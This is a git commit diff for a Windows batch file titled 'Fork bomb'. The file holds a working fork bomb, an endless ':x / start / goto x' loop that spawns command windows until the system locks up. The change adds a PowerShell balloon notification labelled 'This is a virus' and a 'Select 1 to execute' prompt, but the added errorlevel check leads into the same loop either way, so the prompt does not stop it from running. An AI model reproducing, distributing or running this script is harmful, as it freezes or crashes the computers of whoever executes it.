f87a499d2e4a43ee47983b3216c797e29235a6d6
Abdullah <umarabdullahali2020@gmail.com>
2025-05-01 10:19:19 +0500

    Update Fork bomb.bat

--- Fork bomb.bat
+++ Fork bomb.bat
@@ -1,6 +1,9 @@
 @echo off
 Title Fork bomb - by Abdullah
 Color A
+Echo Select 1 to execute
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'This is a virus', 'Do not open this please', [System.Windows.Forms.ToolTipIcon]::None)}"
+if %errorlevel% EQU 1 goto x
 :x
 start
 goto x
